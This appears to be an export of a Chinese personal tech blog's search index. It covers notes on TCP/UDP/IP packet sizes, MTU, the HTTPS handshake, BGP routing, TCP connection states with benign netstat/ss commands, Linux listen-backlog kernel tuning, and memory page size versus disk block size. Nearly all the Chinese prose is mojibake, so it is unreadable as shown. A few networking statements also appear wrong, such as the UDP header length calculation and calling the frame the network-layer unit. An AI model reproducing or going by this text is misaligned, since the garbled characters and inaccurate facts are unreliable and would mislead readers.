window)è¶…æ—¶é‡ä¼ æµé‡æ§åˆ¶ (flow control)æ‹¥å¡æ§åˆ¶ï¼ˆcongestion controlï¼‰ ä¸€ä¸ªtcp,udpæˆ–è€…ipåŒ…æœ€å¤§å¤šå¤§ï¼Œæœ€å°å¤šå¤§æœ€å°æˆ‘ä»¬çŸ¥é“ä¼ é€TCPæ•°æ®åŒ…çš„æ™‚å€™ï¼ŒTCP header å  20 bytesï¼Œ IPv4 header å  20 bytesï¼Œæ‰€ä»¥æœ€å°40byteã€‚é‚£ä¹ˆæœ€å¤§å‘¢TCPã€UDPæ•°æ®åŒ…å¤§å°çš„é™åˆ¶åº”ç”¨å±‚udpæœ€å¤§1500-20-8 = 1472 å­—èŠ‚(å¤šäº†ä¼šè¢«åˆ†ç‰‡é‡ç»„ï¼Œä¸‡ä¸€åˆ†ç‰‡ä¸¢å¤±å¯¼è‡´é‡ç»„å¤±è´¥ï¼Œå°±ä¼šè¢«ä¸¢åŒ…)ï¼Œ1500æ˜¯ç¡¬ä»¶å†³å®šçš„,20æ˜¯ipå¤´ï¼Œ8æ˜¯udpçš„å¤´ç»“è®ºUDP åŒ…çš„å¤§å°å°±åº”è¯¥æ˜¯ 1500 - IPå¤´(20) - UDPå¤´(8) = 1472(Bytes)TCP åŒ…çš„å¤§å°å°±åº”è¯¥æ˜¯ 1500 - IPå¤´(20) - TCPå¤´(20) = 1460 (Bytes)UDPæ•°æ®æŠ¥çš„é•¿åº¦æ˜¯æŒ‡åŒ…æ‹¬æŠ¥å¤´å’Œæ•°æ®éƒ¨åˆ†åœ¨å†…çš„æ€»å­—èŠ‚æ•°ï¼Œå…¶ä¸­æŠ¥å¤´é•¿åº¦å›ºå®šï¼Œæ•°æ®éƒ¨åˆ†å¯å˜ã€‚æ•°æ®æŠ¥çš„æœ€å¤§é•¿åº¦æ ¹æ®æ“ä½œç¯å¢ƒçš„ä¸åŒè€Œå„å¼‚ã€‚ä»ç†è®ºä¸Šè¯´ï¼ŒåŒ…å«æŠ¥å¤´åœ¨å†…çš„æ•°æ®æŠ¥çš„æœ€å¤§é•¿åº¦ä¸º65535å­—èŠ‚(64K)ã€‚ç”¨UDPåè®®å‘é€æ—¶ï¼Œç”¨sendtoå‡½æ•°æœ€å¤§èƒ½å‘é€æ•°æ®çš„é•¿åº¦ä¸ºï¼š65535- IPå¤´(20) - UDPå¤´(8)ï¼65507å­—èŠ‚ã€‚ç”¨sendtoå‡½æ•°å‘é€æ•°æ®æ—¶ï¼Œå¦‚æœå‘é€æ•°æ®é•¿åº¦å¤§äºè¯¥å€¼ï¼Œåˆ™å‡½æ•°ä¼šè¿”å›é”™è¯¯ã€‚MTU æœ€å¤§ä¼ è¾“å•å…ƒï¼ˆè‹±è¯­ï¼šMaximum Transmission Unitï¼Œç¼©å†™MTUï¼‰æ˜¯æŒ‡ä¸€ç§é€šä¿¡åè®®çš„æŸä¸€å±‚ä¸Šé¢æ‰€èƒ½é€šè¿‡çš„æœ€å¤§æ•°æ®åŒ…å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œæ€ä¹ˆçœ‹ ping -l 1472 -f www.baidu.com ##æ ¹æ®æç¤ºå»è°ƒå°è¿™ä¸ªæ•°å°±æ˜¯äº†ï¼Œä¸€èˆ¬1350ä»¥ä¸Šæ˜¯æœ‰çš„ ä»csdnææ¥çš„å›¾ä¼ è¾“å±‚ï¼šå¯¹äºUDPåè®®æ¥è¯´ï¼Œæ•´ä¸ªåŒ…çš„æœ€å¤§é•¿åº¦ä¸º65535ï¼Œå…¶ä¸­åŒ…å¤´é•¿åº¦æ˜¯65535-20=65515ï¼›å¯¹äºTCPåè®®æ¥è¯´ï¼Œæ•´ä¸ªåŒ…çš„æœ€å¤§é•¿åº¦æ˜¯ç”±æœ€å¤§ä¼ è¾“å¤§å°ï¼ˆMSSï¼ŒMaxitum Segment Sizeï¼‰å†³å®šï¼ŒMSSå°±æ˜¯TCPæ•°æ®åŒ…æ¯æ¬¡èƒ½å¤Ÿä¼ è¾“çš„æœ€å¤§æ•°æ®åˆ†æ®µã€‚ä¸ºäº†è¾¾åˆ°æœ€ä½³çš„ä¼ è¾“æ•ˆèƒ½TCPåè®®åœ¨å»ºç«‹è¿æ¥çš„æ—¶å€™é€šå¸¸è¦åå•†åŒæ–¹çš„MSSå€¼ï¼Œè¿™ä¸ªå€¼TCPåè®®åœ¨å®ç°çš„æ—¶å€™å¾€å¾€ç”¨MTUå€¼ä»£æ›¿ï¼ˆéœ€è¦å‡å»IPæ•°æ®åŒ…åŒ…å¤´çš„å¤§å°20Byteså’ŒTCPæ•°æ®æ®µçš„åŒ…å¤´20Bytesï¼‰æ‰€ä»¥å¾€å¾€MSSä¸º1460ã€‚é€šè®¯åŒæ–¹ä¼šæ ¹æ®åŒæ–¹æä¾›çš„MSSå€¼å¾—æœ€å°å€¼ç¡®å®šä¸ºè¿™æ¬¡è¿æ¥çš„æœ€å¤§MSSå€¼ã€‚IPå±‚ï¼šå¯¹äºIPåè®®æ¥è¯´ï¼ŒIPåŒ…çš„å¤§å°ç”±MTUå†³å®šï¼ˆIPæ•°æ®åŒ…é•¿åº¦å°±æ˜¯MTU-28ï¼ˆåŒ…å¤´é•¿åº¦ï¼‰ã€‚ MTUå€¼è¶Šå¤§ï¼Œå°åŒ…å°±è¶Šå¤§ï¼Œç†è®ºä¸Šå¯å¢åŠ ä¼ é€é€Ÿç‡ï¼Œä½†MTUå€¼åˆä¸èƒ½è®¾å¾—å¤ªå¤§ï¼Œå› ä¸ºå°åŒ…å¤ªå¤§ï¼Œä¼ é€æ—¶å‡ºç°é”™è¯¯çš„æœºä¼šå¤§å¢ã€‚ä¸€èˆ¬é»˜è®¤çš„è®¾ç½®ï¼ŒPPPoEè¿æ¥çš„æœ€é«˜MTUå€¼æ˜¯1492, è€Œä»¥å¤ªç½‘ï¼ˆEthernetï¼‰çš„æœ€é«˜MTUå€¼åˆ™æ˜¯1500,è€Œåœ¨Internetä¸Šï¼Œé»˜è®¤çš„MTUå¤§å°æ˜¯576å­—èŠ‚ åè®®æ•°æ®å•å…ƒ(Protocol Data Unit, PDU)åº”ç”¨å±‚æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ²¿ç€åè®®æ ˆä¼ é€’ï¼Œæ¯ä¸€å±‚åè®®éƒ½ä¼šå¾€å…¶ä¸­æ·»åŠ ä¿¡æ¯ï¼Œè¿™å°±æ˜¯å°è£…çš„è¿‡ç¨‹ã€‚åœ¨å°è£…è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€ä¸ªé˜¶æ®µçš„PDUéƒ½æœ‰ä¸åŒçš„åå­—æ¥åæ˜ å®ƒçš„åŠŸèƒ½ã€‚ PDUæŒ‰ç…§TCP/IPåè®®çš„å‘½åè§„èŒƒï¼šæ•°æ®ï¼ˆDataï¼‰ï¼šåº”ç”¨å±‚PDUçš„å¸¸ç”¨æœ¯è¯­åˆ†æ®µï¼ˆSegmentï¼‰ï¼šä¼ è¾“å±‚PDUå¸§ï¼ˆFrameï¼‰ï¼šç½‘ç»œå±‚PDUæ¯”ç‰¹ï¼ˆBitsï¼‰ï¼šåœ¨ä»‹è´¨ä¸Šç‰©ç†ä¼ è¾“æ•°æ®æ‰€ä½¿ç”¨çš„PDUã€‚ æœ€ç»ˆå‘å‡ºå»çš„æ•°æ®åŒ…åº”è¯¥æ˜¯Data link Ethernet Frame Header(Destination mac address + Source mac address) +Network Layer IP Packet Header(Source network:host + Destination network: host) +Transport Header(port) +data httpsç‰ˆæœ¬çš„æ¡æ‰‹ï¼Œè¯ä¹¦æ ¡éªŒï¼Œchange cipherå‡ºå¤„è¯ä¹¦éªŒè¯å®Œæ¯•ä¹‹åï¼Œè§‰å¾—è¿™ä¸ªæœåŠ¡ç«¯æ˜¯å¯ä¿¡çš„ï¼Œäºæ˜¯å®¢æˆ·ç«¯è®¡ç®—äº§ç”Ÿéšæœºæ•°å­—Pre-masterï¼Œå‘é€Client Key Exchangeï¼Œç”¨è¯ä¹¦ä¸­çš„å…¬é’¥åŠ å¯†ï¼Œå†å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¯ä»¥é€šè¿‡ç§é’¥è§£å¯†å‡ºæ¥ã€‚æ¥ä¸‹æ¥ï¼Œæ— è®ºæ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨ï¼Œéƒ½æœ‰äº†ä¸‰ä¸ªéšæœºæ•°ï¼Œåˆ†åˆ«æ˜¯ï¼šè‡ªå·±çš„ã€å¯¹ç«¯çš„ï¼Œä»¥åŠåˆšç”Ÿæˆçš„Pre-Masteréšæœºæ•°ã€‚é€šè¿‡è¿™ä¸‰ä¸ªéšæœºæ•°ï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº§ç”Ÿç›¸åŒçš„å¯¹ç§°å¯†é’¥ã€‚æœ‰äº†å¯¹ç§°å¯†é’¥ï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥è¯´ï¼šâ€œChange Cipher Specï¼Œå’±ä»¬ä»¥åéƒ½é‡‡ç”¨åå•†çš„é€šä¿¡å¯†é’¥å’ŒåŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†é€šä¿¡äº†ã€‚â€ç„¶åå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªEncrypted Handshake Messageï¼Œå°†å·²ç»å•†å®šå¥½çš„å‚æ•°ç­‰ï¼Œé‡‡ç”¨åå•†å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œå‘é€ç»™æœåŠ¡å™¨ç”¨äºæ•°æ®ä¸æ¡æ‰‹éªŒè¯ã€‚åŒæ ·ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥å‘é€Change Cipher Specï¼Œè¯´ï¼šâ€œæ²¡é—®é¢˜ï¼Œå’±ä»¬ä»¥åéƒ½é‡‡ç”¨åå•†çš„é€šä¿¡å¯†é’¥å’ŒåŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†é€šä¿¡äº†â€ï¼Œå¹¶ä¸”ä¹Ÿå‘é€Encrypted Handshake Messageçš„æ¶ˆæ¯è¯•è¯•ã€‚å½“åŒæ–¹æ¡æ‰‹ç»“æŸä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡å¯¹ç§°å¯†é’¥è¿›è¡ŒåŠ å¯†ä¼ è¾“äº† ä¸‹é¢è¿™æ®µæ‘˜è‡ªå¾®ä¿¡å…¬ä¼—å·â€åˆ˜è¶…çš„é€šä¿—äº‘è®¡ç®—â€ å‡ºäº†NATç½‘å…³ï¼Œå°±ä»æ ¸å¿ƒç½‘åˆ°è¾¾äº†äº’è”ç½‘ã€‚åœ¨ç½‘ç»œä¸–ç•Œï¼Œæ¯ä¸€ä¸ªè¿è¥å•†çš„ç½‘ç»œæˆä¸ºè‡ªæ²»ç³»ç»ŸASã€‚æ¯ä¸ªè‡ªæ²»ç³»ç»Ÿéƒ½æœ‰è¾¹ç•Œè·¯ç”±å™¨ï¼Œé€šè¿‡å®ƒå’Œå¤–é¢çš„ä¸–ç•Œå»ºç«‹è”ç³»ã€‚å¯¹äºäº‘å¹³å°æ¥è®²ï¼Œå®ƒå¯ä»¥è¢«ç§°ä¸ºMultihomed ASï¼Œæœ‰å¤šä¸ªè¿æ¥è¿åˆ°å…¶ä»–çš„ASï¼Œä½†æ˜¯å¤§å¤šæ‹’ç»å¸®å…¶ä»–çš„ASä¼ è¾“åŒ…ã€‚ä¾‹å¦‚ä¸€äº›å¤§å…¬å¸çš„ç½‘ç»œã€‚å¯¹äºè¿è¥å•†æ¥è¯´ï¼Œå®ƒå¯ä»¥è¢«ç§°ä¸ºTransit ASï¼Œæœ‰å¤šä¸ªè¿æ¥è¿åˆ°å…¶ä»–çš„ASï¼Œå¹¶ä¸”å¯ä»¥å¸®åŠ©å…¶ä»–çš„ASä¼ è¾“åŒ…ï¼Œæ¯”å¦‚ä¸»å¹²ç½‘ã€‚å¦‚ä½•ä»å‡ºå£çš„è¿è¥å•†åˆ°è¾¾äº‘å¹³å°çš„è¾¹ç•Œè·¯ç”±å™¨ï¼Ÿåœ¨è·¯ç”±å™¨ä¹‹é—´éœ€è¦é€šè¿‡BGPåè®®å®ç°ï¼ŒBGPåˆåˆ†ä¸ºä¸¤ç±»ï¼ŒeBGPå’ŒiBGPã€‚è‡ªæ²»ç³»ç»Ÿé—´ï¼Œè¾¹ç•Œè·¯ç”±å™¨ä¹‹é—´ä½¿ç”¨eBGPå¹¿æ’­è·¯ç”±ã€‚å†…éƒ¨ç½‘ç»œä¹Ÿéœ€è¦è®¿é—®å…¶ä»–çš„è‡ªæ²»ç³»ç»Ÿã€‚è¾¹ç•Œè·¯ç”±å™¨å¦‚ä½•å°†BGPå­¦ä¹ åˆ°çš„è·¯ç”±å¯¼å…¥åˆ°å†…éƒ¨ç½‘ç»œå‘¢ï¼Ÿé€šè¿‡è¿è¡ŒiBGPï¼Œä½¿å†…éƒ¨çš„è·¯ç”±å™¨èƒ½å¤Ÿæ‰¾åˆ°åˆ°è¾¾å¤–ç½‘ç›®çš„åœ°æœ€å¥½çš„è¾¹ç•Œè·¯ç”±å™¨ã€‚ç½‘ç«™çš„SLBçš„å…¬ç½‘IPåœ°å€æ—©å·²ç»é€šè¿‡äº‘å¹³å°çš„è¾¹ç•Œè·¯ç”±å™¨ï¼Œè®©å…¨ç½‘éƒ½çŸ¥é“äº†ã€‚äºæ˜¯è¿™ä¸ªä¸‹å•çš„ç½‘ç»œåŒ…é€‰æ‹©äº†ä¸‹ä¸€è·³æ˜¯A2ï¼Œä¹Ÿå³å°†A2çš„MACåœ°å€æ”¾åœ¨ç›®æ ‡MACåœ°å€ä¸­ã€‚åˆ°è¾¾A2ä¹‹åï¼Œä»è·¯ç”±è¡¨ä¸­æ‰¾åˆ°ä¸‹ä¸€è·³æ˜¯è·¯ç”±å™¨C1ï¼Œäºæ˜¯å°†ç›®æ ‡MACæ¢æˆC1çš„MACåœ°å€ã€‚åˆ°è¾¾C1ä¹‹åï¼Œæ‰¾åˆ°ä¸‹ä¸€è·³æ˜¯C2ï¼Œå°†ç›®æ ‡MACåœ°å€è®¾ç½®ä¸ºC2çš„MACã€‚åˆ°è¾¾C2åï¼Œæ‰¾åˆ°ä¸‹ä¸€è·³æ˜¯äº‘å¹³å°çš„è¾¹ç•Œè·¯ç”±å™¨ï¼Œäºæ˜¯å°†ç›®æ ‡MACè®¾ç½®ä¸ºè¾¹ç•Œè·¯ç”±å™¨çš„MACåœ°å€ã€‚ä½ ä¼šå‘ç°ï¼Œè¿™ä¸€è·¯ï¼Œéƒ½æ˜¯åªæ¢MACï¼Œä¸æ¢ç›®æ ‡IPåœ°å€ã€‚è¿™å°±æ˜¯æ‰€è°“ä¸‹ä¸€è·³çš„æ¦‚å¿µã€‚åœ¨äº‘å¹³å°çš„è¾¹ç•Œè·¯ç”±å™¨ï¼Œä¼šå°†ä¸‹å•çš„åŒ…è½¬å‘è¿›æ¥ï¼Œç»è¿‡æ ¸å¿ƒäº¤æ¢ï¼Œæ±‡èšäº¤æ¢ï¼Œåˆ°è¾¾å¤–ç½‘ç½‘å…³èŠ‚ç‚¹ä¸Šçš„SLBçš„å…¬ç½‘IPåœ°å€ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ‰‹æœºåˆ°SLBçš„å…¬ç½‘IPï¼Œæ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯çš„è¿æ¥ï¼Œè¿æ¥çš„è¿‡ç¨‹å‘é€äº†å¾ˆå¤šåŒ…ã€‚æ‰€æœ‰è¿™äº›åŒ…ï¼Œæ— è®ºæ˜¯TCPä¸‰æ¬¡æ¡æ‰‹ï¼Œè¿˜æ˜¯HTTPSçš„å¯†é’¥äº¤æ¢ï¼Œéƒ½æ˜¯è¦èµ°å¦‚æ­¤å¤æ‚çš„è¿‡ç¨‹åˆ°è¾¾SLBçš„ï¼Œå½“ç„¶æ¯ä¸ªåŒ…èµ°çš„è·¯å¾„ä¸ä¸€å®šä¸€è‡´ã€‚ UDPUDPçš„é¦–éƒ¨åªæœ‰8ä¸ªå­—èŠ‚ï¼Œ12 å­—èŠ‚çš„ä¼ªé¦–éƒ¨æ˜¯ä¸ºäº†è®¡ç®—æ£€éªŒå’Œä¸´æ—¶æ·»åŠ çš„ã€‚ å‚è€ƒTCP æŠ¥æ–‡ç»“æ„tcpåŒ…ç»“æ„æ¨å¹¿å•†ä¸šè½¯ä»¶çš„æ–‡ç« ï¼Œå½“åšå…³äºtcpåè®®çš„ä¸€æ•´ä¸ªseriesæ¥çœ‹è¿˜æ˜¯å¾ˆå¥½çš„ HTTPå¹‚ç­‰æ€§(ç”¨CAS)é¿å…ä¸‹å•ä¸¤æ¬¡ TCPç«¯å£çŠ¶æ€è¯´æ˜ESTABLISHEDã€TIME_WAITFIN_WAIT2 netstat -n | awk &#39;/^tcp/ {++state[$NF]} END {for(key in state) print key,&quot;\\t&quot;,state[key]}&#39; æ²¡æœ‰å®‰è£…netstatçš„è¯ï¼Œä½¿ç”¨sså¯ä»¥æ”¹ä¸€ä¸‹å‘½ä»¤ ss -t -a | awk &#39;{++State[$1]} END {for(key in State) print key,&quot;\\t&quot;,State[key]}&#39; è¾“å‡ºå¤§æ¦‚æ˜¯è¿™æ ·çš„ CLOSE-WAIT 2 LAST-ACK 2 ESTAB 17 TIME-WAIT 1 LISTEN 16 State 1 CLOSEDï¼šæ— è¿æ¥æ˜¯æ´»åŠ¨çš„æˆ–æ­£åœ¨è¿›è¡ŒLISTENï¼šæœåŠ¡å™¨åœ¨ç­‰å¾…è¿›å…¥å‘¼å«SYN_RECVï¼šä¸€ä¸ªè¿æ¥è¯·æ±‚å·²ç»åˆ°è¾¾ï¼Œç­‰å¾…ç¡®è®¤SYN_SENTï¼šåº”ç”¨å·²ç»å¼€å§‹ï¼Œæ‰“å¼€ä¸€ä¸ªè¿æ¥ESTABLISHEDï¼šæ­£å¸¸æ•°æ®ä¼ è¾“çŠ¶æ€FIN_WAIT1ï¼šåº”ç”¨è¯´å®ƒå·²ç»å®ŒæˆFIN_WAIT2ï¼šå¦ä¸€è¾¹å·²åŒæ„é‡Šæ”¾ITMED_WAITï¼šç­‰å¾…æ‰€æœ‰åˆ†ç»„æ­»æ‰CLOSINGï¼šä¸¤è¾¹åŒæ—¶å°è¯•å…³é—­TIME_WAITï¼šå¦ä¸€è¾¹å·²åˆå§‹åŒ–ä¸€ä¸ªé‡Šæ”¾LAST_ACKï¼šç­‰å¾…æ‰€æœ‰åˆ†ç»„æ­»æ‰ æŸ¥çœ‹æœ¬æœºç½‘ç»œè¿æ¥ tcpæ»‘åŠ¨çª—å£] IPv4å’ŒIPv6çš„åœ°å€æ ¼å¼å®šä¹‰åœ¨netinet/in.hä¸­ï¼ŒIPv4åœ°å€ç”¨sockaddr_inç»“æ„ä½“è¡¨ç¤ºï¼ŒåŒ…æ‹¬16ä½ç«¯å£å·å’Œ32ä½IPåœ°å€ï¼ŒIPv6åœ°å€ç”¨sockaddr_in6ç»“æ„ä½“è¡¨ç¤ºï¼ŒåŒ…æ‹¬16ä½ç«¯å£å·ã€128ä½IPåœ°å€å’Œä¸€äº›æ§åˆ¶å­—æ®µã€‚æ‰€ä»¥ipv6çš„ipæ•°é‡è¦å¤§å¾—å¤šã€‚ tweak kernel parametersnet.ipv4.tcp_max_syn_backlog = 100000 how many half-open connections for which the client has not yet sent an ACK response can be kept in the queue. The default net.ipv4.tcp_max_syn_backlog is set to 128 net.core.somaxconn = 100000 // é»˜è®¤æ˜¯128 ï¼Œè¿™ä¸ªå€¼å’Œlistenæ–¹æ³•ä¼ å…¥çš„backlogçš„minå€¼å†³å®šäº†accept queueé˜Ÿåˆ—çš„å¤§å°(æ‰€ä»¥è¦è°ƒå¤§å…‰æ˜¯åº”ç”¨å±‚æ”¹backlogè¿˜ä¸å¤Ÿï¼Œè¿˜å¾—è°ƒå†…æ ¸å‚æ•°)ï¼Œè¿™ä¸ªé˜Ÿåˆ—æ˜¯ä¿ç•™å…¨è¿æ¥çš„ã€‚æ»¡äº†çš„è¯ä¼šæŠ¥connection refusedã€‚ the maximum value that net.ipv4.tcp_max_syn_backlog can take. Higher values are silently truncated to the value indicated by somaxconn net.core.netdev_max_backlog = 100000 the maximum number of packets in the receive queue that passed through the network interface and are waiting to be processed by the kernel. The default is set to 1000 on Ubuntu 16.04 TCPçš„è¿æ¥é˜Ÿåˆ—ä¸backlogå‚æ•° ä¸­æåˆ° å½“ client é€šè¿‡ connect å‘ server å‘å‡º SYN åŒ…æ—¶ï¼Œclient ä¼šç»´æŠ¤ä¸€ä¸ª socket ç­‰å¾…é˜Ÿåˆ—ï¼Œè€Œ server ä¼šç»´æŠ¤ä¸€ä¸ª SYN é˜Ÿåˆ—ï¼› æ­¤æ—¶è¿›å…¥åŠé“¾æ¥çš„çŠ¶æ€ï¼Œå¦‚æœ socket ç­‰å¾…é˜Ÿåˆ—æ»¡äº†ï¼Œserver åˆ™ä¼šä¸¢å¼ƒï¼Œè€Œ client ä¹Ÿä¼šç”±æ­¤è¿”å› connection time outï¼›åªè¦æ˜¯ client æ²¡æœ‰æ”¶åˆ° SYN+ACKï¼Œ3s ä¹‹åï¼Œclient ä¼šå†æ¬¡å‘é€ï¼Œå¦‚æœä¾ç„¶æ²¡æœ‰æ”¶åˆ°ï¼Œ9s ä¹‹åä¼šç»§ç»­å‘é€ï¼› åŠè¿æ¥ syn é˜Ÿåˆ—çš„é•¿åº¦ä¸º max(64, /proc/sys/net/ipv4/tcp_max_syn_backlog) å†³å®š å½“ server æ”¶åˆ° client çš„ SYN åŒ…åï¼Œä¼šè¿”å› SYN, ACK çš„åŒ…åŠ ä»¥ç¡®è®¤ï¼Œclient çš„ TCP åè®®æ ˆä¼šå”¤é†’ socket ç­‰å¾…é˜Ÿåˆ—ï¼Œå‘å‡º connect è°ƒç”¨ï¼› client è¿”å› ACK çš„åŒ…åï¼Œserver ä¼šè¿›å…¥ä¸€ä¸ªæ–°çš„å« accept çš„é˜Ÿåˆ—ï¼Œè¯¥é˜Ÿåˆ—çš„é•¿åº¦ä¸º min(backlog, somaxconn)ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œsomaxconn çš„å€¼ä¸º 128ï¼Œè¡¨ç¤ºæœ€å¤šæœ‰ 129 çš„ ESTAB çš„è¿æ¥ç­‰å¾… accept()ï¼Œè€Œ backlog çš„å€¼åˆ™ç”± int listen(int sockfd, int backlog) ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šï¼Œlisten é‡Œé¢çš„ backlog çš„å«ä¹‰è¯·çœ‹è¿™é‡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€äº› Linux çš„å‘å‹ç‰ˆæœ¬å¯èƒ½å­˜åœ¨å¯¹ somaxcon é”™è¯¯ truncating æ–¹å¼ï¼› å½“ accept é˜Ÿåˆ—æ»¡äº†ä¹‹åï¼Œå³ä½¿ client ç»§ç»­å‘ server å‘é€ ACK çš„åŒ…ï¼Œä¹Ÿä¼šä¸è¢«ç›¸åº”ï¼Œæ­¤æ—¶ï¼Œserver é€šè¿‡ /proc/sys/net/ipv4/tcp_abort_on_overflow æ¥å†³å®šå¦‚ä½•è¿”å›ï¼Œ0 è¡¨ç¤ºç›´æ¥ä¸¢ä¸¢å¼ƒè¯¥ ACKï¼Œ1 è¡¨ç¤ºå‘é€ RST é€šçŸ¥ clientï¼›ç›¸åº”çš„ï¼Œclient åˆ™ä¼šåˆ†åˆ«è¿”å› read timeout æˆ–è€… connection reset by peerã€‚ä¸Šé¢è¯´çš„åªæ˜¯äº›ç†è®ºï¼Œå¦‚æœæœåŠ¡å™¨ä¸åŠæ—¶çš„è°ƒç”¨ accept()ï¼Œå½“ queue æ»¡äº†ä¹‹åï¼ŒæœåŠ¡å™¨å¹¶ä¸ä¼šæŒ‰ç…§ç†è®ºæ‰€è¿°ï¼Œä¸å†å¯¹ SYN è¿›è¡Œåº”ç­”ï¼Œè¿”å› ETIMEDOUTã€‚æ ¹æ®è¿™ç¯‡æ–‡æ¡£çš„æè¿°ï¼Œå®é™…æƒ…å†µå¹¶éå¦‚æ­¤ï¼ŒæœåŠ¡å™¨ä¼šéšæœºçš„å¿½ç•¥æ”¶åˆ°çš„ SYNï¼Œå»ºç«‹èµ·æ¥çš„è¿æ¥æ•°å¯ä»¥æ— é™çš„å¢åŠ ï¼Œåªä¸è¿‡å®¢æˆ·ç«¯ä¼šé‡åˆ°å»¶æ—¶ä»¥åŠè¶…æ—¶çš„æƒ…å†µã€‚","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"page-size and block size","date":"2018-12-02T21:42:24.000Z","path":"2018/12/02/2018-12-02-page-size-and-block-size/","text":"page sizeï¼ˆå†…å­˜ç›¸å…³ï¼‰å’Œblock size(æ–‡ä»¶ç³»ç»Ÿç›¸å…³)çš„ä¸€äº›ç‚¹wikiä¸Šè¯´Page sizeå¸¸ç”±processorçš„æ¶æ„å†³å®šçš„ï¼Œæ“ä½œç³»ç»Ÿç®¡ç†å†…å­˜çš„æœ€å°å•ä½æ˜¯ä¸€ä¸ªPage size(åº”ç”¨ç¨‹åºç”³è¯·åˆ†é…å†…å­˜æ—¶ï¼Œæ“ä½œç³»ç»Ÿå®é™…åˆ†é…çš„å†…å­˜æ˜¯page-sizeçš„æ•´æ•°å€) Block size vs. page size block size concerns storage space on a filesystem.Page size is, I believe, architecture-dependent, 4k being the size for IA-32 (x86) machines. For IA-64 architecture, Iâ€™m pretty sure you can set the page size at compile time, with 8k or 16k considered optimal. Again, Iâ€™m not positive, but I think Linux supports 4,8,16, and 64k pages.Block size is a function of the filesystem in use. Many, if not all filesystems allow you to choose the block size when you format, although for some filesystems the block size is tied to/dependent upon the page size.Minimun block size is usually 512 bytes, the allowed values being determined by the filesystem in question. unixç³»ç»Ÿä¸­æŸ¥çœ‹ç³»ç»Ÿçš„page size getconf PAGESIZE ## X86æ¶æ„çš„cpuä¸Šä¸€èˆ¬æ˜¯4096byte ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç°è±¡æ˜¯ï¼Œjava BufferedInputStreamçš„é»˜è®¤bufferæ•°ç»„å¤§å°æ˜¯8192ï¼Œokio çš„segmentçš„é»˜è®¤sizeä¹Ÿæ˜¯8192ï¼Œè¿™äº›éƒ½æ˜¯ä»¥byteä¸ºå•ä½çš„ã€‚æ‰¾åˆ°ä¸€ä¸ªåˆç†çš„è§£é‡Šã€‚å¤§è‡´æ„æ€æ˜¯8192 = 2^13, windowså’Œlinuxä¸Šè¿™ä¸ªå¤§å°æ­£å¥½å ç”¨ä¸¤ä¸ªåˆ†é¡µæ–‡ä»¶(8kB)ã€‚ block size(ç¡¬ç›˜å—)æ‘˜æŠ„ä¸€æ®µæ¥è‡ªæ·±å…¥æµ…å‡ºè…¾è®¯äº‘CDNï¼šç¼“å­˜ç¯‡çš„è¯ï¼š ä¸ç®¡SSDç›˜æˆ–è€…SATAç›˜éƒ½æœ‰æœ€å°çš„æ“ä½œå•ä½ï¼Œå¯èƒ½æ˜¯512Bï¼Œ4KBï¼Œ8KBã€‚å¦‚æœè¯»å†™è¿‡ç¨‹ä¸­ä¸è¿›è¡Œå¯¹é½ï¼Œåº•å±‚çš„ç¡¬ä»¶æˆ–è€…é©±åŠ¨å°±éœ€è¦æ›¿åº”ç”¨å±‚æ¥åšå¯¹é½æ“ä½œï¼Œå¹¶å°†ä¸€æ¬¡è¯»å†™æ“ä½œåˆ†è£‚ä¸ºå¤šæ¬¡è¯»å†™æ“ä½œã€‚ ä»€ä¹ˆæ˜¯å†…å­˜å¯¹é½ï¼Œä¸ºä»€ä¹ˆè¦å¯¹é½ï¼Ÿ ç°ä»£è®¡ç®—æœºä¸­å†…å­˜ç©ºé—´éƒ½æ˜¯æŒ‰ç…§ byte åˆ’åˆ†çš„ï¼Œä»ç†è®ºä¸Šè®²ä¼¼ä¹å¯¹ä»»ä½•ç±»å‹çš„å˜é‡çš„è®¿é—®å¯ä»¥ä»ä»»ä½•åœ°å€å¼€å§‹ï¼Œä½†å®é™…æƒ…å†µæ˜¯åœ¨è®¿é—®ç‰¹å®šå˜é‡çš„æ—¶å€™ç»å¸¸åœ¨ç‰¹å®šçš„å†…å­˜åœ°å€è®¿é—®ï¼Œè¿™å°±éœ€è¦å„ç±»å‹æ•°æ®æŒ‰ç…§ä¸€å®šçš„è§„åˆ™åœ¨ç©ºé—´ä¸Šæ’åˆ—ï¼Œè€Œä¸æ˜¯é¡ºåºçš„ä¸€ä¸ªæ¥ä¸€ä¸ªçš„æ’æ”¾ï¼Œè¿™å°±æ˜¯å¯¹é½ã€‚å¯¹é½çš„ä½œç”¨å’ŒåŸå› 